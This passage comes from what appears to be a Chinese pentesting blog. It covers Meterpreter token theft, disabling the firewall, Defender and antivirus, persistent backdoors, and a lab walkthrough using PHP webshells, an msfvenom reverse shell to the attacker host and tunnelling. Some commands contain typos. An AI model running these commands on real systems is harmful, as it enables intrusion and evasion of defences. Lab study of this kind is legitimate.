<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021212304540.png" alt="image-20211021212304540"></p>
<p>可以看到我们此时的会话进程号是1288，令牌是SYSTEM</p>
<p><img src="/2021/11/01/windows%E4%BB%A4%E7%89%8C%E5%81%87%E5%86%92/image-20211021212412558.png" alt="image-20211021212412558"></p>
<p>盗取dwm.exe进程的令牌ndsec-PC\ndsec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token 2884</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-杀软及防火墙关闭"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/" class="article-date">
  <time datetime="2021-11-01T10:06:31.390Z" itemprop="datePublished">2021-11-01</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="杀软及防火墙关闭"><a href="#杀软及防火墙关闭" class="headerlink" title="杀软及防火墙关闭"></a>杀软及防火墙关闭</h1><hr>
<p>该文章记录使用msf工具进行后渗透模块，将目标主机的防火墙和杀毒软件进行关闭，方便后续上传后门和开启敏感端口</p>
<h2 id="windows自带防火墙服务"><a href="#windows自带防火墙服务" class="headerlink" title="windows自带防火墙服务"></a>windows自带防火墙服务</h2><h3 id="windows防火墙"><a href="#windows防火墙" class="headerlink" title="windows防火墙"></a>windows防火墙</h3><hr>
<p>关闭windows系统防火墙需进入目标主机shell和拥有管理员及以上权限才能执行，若权限不足需进行提权操作</p>
<p>首先使用msf反弹shell成功后，在meterpreter通道中进去目标主机shell，此时的权限为系统管理员权限</p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110239586.png" alt="image-20211021110239586"><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110239705.png" alt="image-20211021110239705"></p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110136651.png" alt="image-20211021110136651"></p>
<p>使用netsh命令关闭windows防火墙</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110353082.png" alt="image-20211021110353082"></p>
<p>目标主机之前的windows防火墙是开启的</p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110536165.png" alt="image-20211021110536165"></p>
<p>执行命令后被关闭</p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021110718801.png" alt="image-20211021110718801"></p>
<h3 id="Denfender服务"><a href="#Denfender服务" class="headerlink" title="Denfender服务"></a>Denfender服务</h3><hr>
<p>Denfender是系统防火墙服务，可通过管理控制台命令停止该服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop windefend(服务名称)</span><br></pre></td></tr></table></figure>

<p>关闭windows Defender服务</p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111629546.png" alt="image-20211021111629546"></p>
<p>服务开启自启动</p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111451170.png" alt="image-20211021111451170"></p>
<p>服务停止</p>
<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021111952028.png" alt="image-20211021111952028"></p>
<h3 id="DEP-数据执行保护"><a href="#DEP-数据执行保护" class="headerlink" title="DEP(数据执行保护)"></a>DEP(数据执行保护)</h3><hr>
<p>DEP 可以防止应用运行用于暂存指令的那部分内存中的数据，从而保护电脑。 如果 DEP 发现某个运行此类数据的应用，它将关闭该应用并通知你</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit.exe /set &#123;current&#125; nx AlwaysOf</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/01/%E6%9D%80%E8%BD%AF%E5%8F%8A%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%AD/image-20211021112310183.png" alt="image-20211021112310183"></p>
<h2 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h2><hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run  killav</span><br><span class="line"></span><br><span class="line">run post/windows/manage/killava</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-后门永久植入"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/" class="article-date">
  <time datetime="2021-11-01T10:06:31.382Z" itemprop="datePublished">2021-11-01</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
<h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h2><h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><hr>
<p>该模块生成一个端口为31337服务，并且上传到Temp临时文件夹下保存，当系统启动时直接开启服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" alt="image-20211028164717074"></p>
<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><hr>
<p>该后门 模块 是通过设置定期时间连接服务器端口，系统启动时回连，自动运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 服务器端口 -r 服务器ip地址</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/01/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" alt="image-20211028165356667"></p>
<p>可以看到生成个自动运行的木马到临时文件夹中，随着系统开启而运行</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-红日靶场内网渗透"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
     
    <div class="article-meta">
      <a href="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="article-date">
  <time datetime="2021-10-22T10:24:15.590Z" itemprop="datePublished">2021-10-22</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="红日靶场内网渗透"><a href="#红日靶场内网渗透" class="headerlink" title="红日靶场内网渗透"></a>红日靶场内网渗透</h1><h2 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h2><p>外网攻击主机:  kali         </p>
<p>172.16.243.128</p>
<p>内网中的web服务器:   win7      </p>
<p>公网ip:   172.16.243.130</p>
<p> 私网ip:   192.168.52.140</p>
<p>​      </p>
<p>内网中的域成员主机:   win2003</p>
<p>  192.168.52.141</p>
<p>内网中的域控主机:     win2008</p>
<p>  192.168.52.138</p>
<p>kali作为攻击主机，win7作为web服务器防止两个网卡，能连接内网，web服务被外网所访问</p>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>首先确定攻击网卡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ettercap -I</span><br><span class="line">或者 ifconfig </span><br></pre></td></tr></table></figure>

<p>可以看到下面的kali的两个网卡，这里使用的是eth0网卡</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805200341062.png" alt="image-20210805200341062"></p>
<p>使用arp-scan对主机使用网卡的局域网内的主机进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -interface=eth0 --localnet</span><br></pre></td></tr></table></figure>

<p>可以看到eth0局域网中的存活主机，这里可以看到内网中开放的web服务器主机为172.16.243.130</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210805201058838.png" alt="image-20210805201058838"></p>
<p>下面对目标web服务器进行信息收集，比如端口，操作系统等信息</p>
<p>使用nmap进行端口扫描和目标系统探测</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp -sV -A 172.16.243.130</span><br><span class="line">-sV   扫描目标主机运行软件的版本</span><br><span class="line">-A    扫描目标主机的操作系统和版本检测，脚本扫描和路由跟踪等</span><br></pre></td></tr></table></figure>

<p>可以看到扫描出来的结果，目标主机开放80和3306端口,目标主机开放的两个端口都有可利用价值，对于3306端口的mysql服务，我们可以尝试暴力破解其用户名和密码</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805201824989.png" alt="image-20210805201824989"></p>
<p>访问目标主机的web服务,可以看到目标服务器phpstudy的web探针和php版本信息</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202527075.png" alt="image-20210805202527075"></p>
<p>对于web探针页面，我们可以看到很多信息，服务器系统版本，web中间件的版本，主机名，管理员邮箱和web绝对根目录等敏感信息</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805202702697.png" alt="image-20210805202702697"></p>
<p>使用dirsearch和dirmap等工具对服务器进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u &quot;http://172.16.243.130&quot; -e</span><br></pre></td></tr></table></figure>





<p>服务器目录如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin     ##mysql数据库管理工具</span><br><span class="line"></span><br><span class="line">phpinfo.php     ##php版本信息</span><br><span class="line"></span><br><span class="line">1.php               </span><br><span class="line"></span><br><span class="line">beifen.rar</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="拿取目标主机shell权限"><a href="#拿取目标主机shell权限" class="headerlink" title="拿取目标主机shell权限"></a>拿取目标主机shell权限</h3><p>1.由于目标服务器存在phpmyadmin，我们访问该数据库管理后台，尝试弱口令，暴力破解等</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210542586.png" alt="image-20210805210542586"></p>
<p>这里使用弱口令root  root登录了后台</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805210815913.png" alt="image-20210805210815913"></p>
<p>可以看到目标服务器中的数据库列表如下，值得注意的是mysql数据库中的user数据表和newyxcms数据库(这个可能是旁站cms的数据库)</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111233382.png" alt="image-20210806111233382"></p>
<p>进入后台我们想拿到服务器shell权限，由于在之前信息收集中知道了绝对路径，所以尝试使用sql语句写入一句话木马，然后使用工具连接，拿到服务器shell权限</p>
<p>在SQL窗口执行写入一句话木马SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpstudy/www/cmd.php&#x27;;</span><br></pre></td></tr></table></figure>

<p>但提示由于设置了secure_file_priv选项限制了文件的写入</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805211802360.png" alt="image-20210805211802360"></p>
<p>我们来看看secure_file_priv这个参数的设置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW GLOBAL VARIABLES LIKE &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>

<p>可以看到该参数设置为NULL，表示限制啦mysql不允许导入导出，写入文件</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805213119488.png" alt="image-20210805213119488"></p>
<p>我们换个思路，对于数据库的日志记录，尝试修改日志文件为php后缀指定文件，然后将一句话木马写入该日志记录文件中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;      ##开启日志记录</span><br><span class="line">set global general_log_file=&#x27;C:/phpstudy/WWW/eval.php&#x27;;      ##指定日志记录文件位置为根目录下</span><br><span class="line">select &#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27;;                    ##输入查询一句话语句，日志记录开启记录在指定文件中</span><br></pre></td></tr></table></figure>



<p>访问172.16.243.130/eval.php,可以看到写入eval.php成功</p>
<p><img src="/home/haoyun/.config/Typora/typora-user-images/image-20210805215930898.png" alt="image-20210805215930898"></p>
<p>2.在之前对目标网站的目录进行扫描时，发现个压缩包叫做beifen.rar，下载后解压发现为yxcms文件夹，判断目标网站存在旁站，目标服务器部署了一个网站</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806111905032.png" alt="image-20210806111905032"></p>
<p>在网上搜索了一下，发现yxcms是一个企业化的建站系统,YXcms是一款基于PHP+MySql开发的网站管理系统，采用轻量级[MVC设计模式]。</p>
<p>其默认的后台页面为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://域名或ip/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>



<p>构造url访问该网站页面:<a target="_blank" rel="noopener" href="http://172.16.243.130/yscms">http://172.16.243.130/yscms</a></p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113506787.png" alt="image-20210806113506787"></p>
<p>浏览了一下主页面，出来有个cms后台登录页面看起来有点意思，其余的没什么好东西，于是点击登录，尝试弱口令登录后台</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113733048.png" alt="image-20210806113733048"></p>
<p>结果显示登录失败</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806113851326.png" alt="image-20210806113851326"></p>
<p>我看了看url中的r参数为member，是否通过r参数来判断一般用户和管理员登录权限，于是将r修改成admin尝试访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.243.130/yxcms/index.php?r=admin</span><br></pre></td></tr></table></figure>

<p>可以看到yxcms的管理后台，尝试使用弱口令admin 123456进行登录</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806114049007.png" alt="image-20210806114049007"></p>
<p>成功登录后台页面，可以看到很多服务器相关信息和yxcms网站相关设置和功能</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806115148987.png" alt="image-20210806115148987"></p>
<p>在全局设置中的前台模板中，我们可以修改模板文件，我们可以将木马代码插入其中并进行加载</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806141921572.png" alt="image-20210806141921572"></p>
<p>通过上述的一些方法将一句话木马上传到目标web服务器中，然后使用webshell工具去连接目标路径的木马，拿到web服务器的shell和权限</p>
<p>使用weevely生成木马文件test.php,并将其上传到目标web服务器上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate password(密码)  test.php(生成文件名)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144420340.png" alt="image-20210806144420340"></p>
<p>然后去连接服务器上的test.php文件，连接建立会话成功</p>
<p>weevely  <a target="_blank" rel="noopener" href="http://172.16.243.130/test.php(%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84)">http://172.16.243.130/test.php(文件路径)</a>  password(密码)</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806144559145.png" alt="image-20210806144559145"></p>
<p>接下来我们在攻击主机上利用msfvenom生成反弹shell的木马qq.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.243.128 lport=12345 -f exe &gt; qq.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806151838583.png" alt="image-20210806151838583"></p>
<p>然后我们将qq.exe通过weevely上传到目标服务器目录中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_upload /opt/tools/web/auto/metasploit/qq.exe qq.exe</span><br></pre></td></tr></table></figure>



<p>运行该木马程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_sh qq.exe</span><br></pre></td></tr></table></figure>



<p>接着打开msfconsole，开启监听模块设置参数反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole         ###打开metasploit</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler   ###设置监听模块</span><br><span class="line"></span><br><span class="line">set lhost 172.16.243.1      ##设置监听主机ip地址</span><br><span class="line"> </span><br><span class="line">set lport 12345              ###设置监听主机端口</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806153849245.png" alt="image-20210806153849245"></p>
<p>可以看到反弹shell成功，通道建立成功</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806200708273.png" alt="image-20210806200708273"></p>
<h3 id="目标主机信息收集"><a href="#目标主机信息收集" class="headerlink" title="目标主机信息收集"></a>目标主机信息收集</h3><p>后渗透阶段先不急着立马提权或者进行横向渗透，先对目标主机以及所在环境进行全方位的信息收集</p>
<p>主机信息收集的常用cmd命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">systeminfo                  #查看详细的系统信息</span><br><span class="line">whoami                      #查看当前使用用户</span><br><span class="line">hostname                    #主机名称</span><br><span class="line">net user                    #查看主机上的用户</span><br><span class="line">net localgroup administrators     #查看系统管理员组中的用户列表</span><br><span class="line">ipconfig /all              #查看主机网络配置情况</span><br><span class="line">net share                  #查看本地开启的共享的文件夹</span><br><span class="line">netstat -ano | findstr &quot;端口号&quot;   #查看指定端口的开放情况</span><br><span class="line">wmic product  get name,version   #查询已安装的软件名称及版本情况</span><br><span class="line">cmdkey  /list              #查看3389远程端口可信任链接</span><br><span class="line">FOR /f &quot;skip=1 token=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;) do dir /a /b C:\$Recycle.Bin\%d\ ^&gt;%c.txt  #windows回收站的信息获取</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用systeminfo查看目标主机的系统信息</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203335970.png" alt="image-20210806203335970"></p>
<p>可以看到主机的安装的修补程序，这也是需要着重观察的信息，我们可以通过该修补程序中没有的补丁来查看主机漏洞进行攻击</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806203504328.png" alt="image-20210806203504328"></p>
<p>可以看到拿到目标主机的权限是管理员权限</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806204341557.png" alt="image-20210806204341557"></p>
<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用的域信息收集命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net view /domain          #查看域</span><br><span class="line">net group /domain         #查询组</span><br><span class="line">net user  /domain         #查询域用户</span><br><span class="line">net group  &quot;domain admin&quot;  /domain     #查询域管理员信息</span><br><span class="line">net group  &quot;domain computers&quot;  /domain   #查询域内机器信息</span><br><span class="line">net config workstation        #查看当前计算机名，全名，用户名等信息</span><br><span class="line">net time  /domain             #查询主域服务器的时间</span><br></pre></td></tr></table></figure>

<p>上述的命令会发送到域控中查询信息，如果渗透的机器不是与用户则不是域用户权限，但是存在域</p>
<p>下面为当前计算机的相关信息，可以看到指定的域dns名称为god.org</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211120373.png" alt="image-20210806211120373"></p>
<p>一般来说，域主机的DNS服务器指定的是域控的ip地址，我们可以使用nslookup来观察dns服务器ip地址和解析god.org的A记录ip地址。可以看到ip地址都为192.168.52.138,则可以判断域控为它</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806211603738.png" alt="image-20210806211603738"></p>
<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>这里由于反弹shell后连接的目标主机权限为管理员权限，也就省去了提权的操作。收集完目标主机的相关信息后，下面就是对处于内网的主机进行横向渗透，先对域内的主机进行渗透，然后在对域控进行渗透</p>
<h4 id="路由-端口转发"><a href="#路由-端口转发" class="headerlink" title="路由/端口转发"></a>路由/端口转发</h4><p>要想在处于外网的攻击主机连接处于内网域中的主机，肯定是不能直接连接的，要通过受控主机进行端口转发或者路由转发，使受控主机充当个路由转发使外网的主机能连接处于内网的主机</p>
<p><strong>1.直接利用msf添加到内网网段的路由</strong></p>
<p>msf路由相关命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets            #查看本机的路由</span><br><span class="line">run autoroute  -s  192.168.52.0/24  #添加目标内网网段到路由信息中</span><br><span class="line">run autoroute  -p               #查看当前的路由设置</span><br></pre></td></tr></table></figure>

<p>可以看到当前的路由设置为到内网网段，现在就可以通过msf访问内网主机</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210806212949813.png" alt="image-20210806212949813"></p>
<p><strong>2.将内网穿透工具上传到web服务器上，然后在攻击机上进行连接指定端口</strong></p>
<p>这里使用venom工具进行内网穿透，将agent.exe使用upload命令上传到目标web服务器上，然后在攻击机上运行admin客户端程序</p>
<p>这里使用反向代理，客户端监听4444端口，让服务端来连接客户端(admin和agent都可以进行监听和连接)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 4444</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808182501466.png" alt="image-20210808182501466"></p>
<p>在目标主机上运行agent.exe指定admin的ip地址和端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">agent.exe -rhost 172.16.243.1  -rport 4444</span><br></pre></td></tr></table></figure>





<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h4><p>下面就是对目标内网进行信息收集</p>
<p>探测内网中的存活主机，有那些域主机和域控主机</p>
<p>这里使用的是metasploit的auxiliary/scanner/portscan模块进行端口信息的收集，在之前的信息收集中可以发现域内出来138这台域控外还有一台域内主机，我们首先对这台域内主机进行渗透</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>



<p>可以看到该台域内主机的端口开放如下:</p>
<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210808214717299.png" alt="image-20210808214717299"></p>
<p>对域控主机182.168.52.138进行端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auiliary/scanner/portscan</span><br><span class="line">set rhost 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20210810112439456.png" alt="image-20210810112439456"></p>
<h4 id="域内主机渗透"><a href="#域内主机渗透" class="headerlink" title="域内主机渗透"></a>域内主机渗透</h4><h4 id="漏洞检测利用"><a href="#漏洞检测利用" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h4><p>目标端口的139和445端口开放，联想到ms17-010这个漏洞，尝试去验证这个漏洞是否存在</p>
<p>首先使用nmap自带的脚本进行漏洞Fuzz：</p>
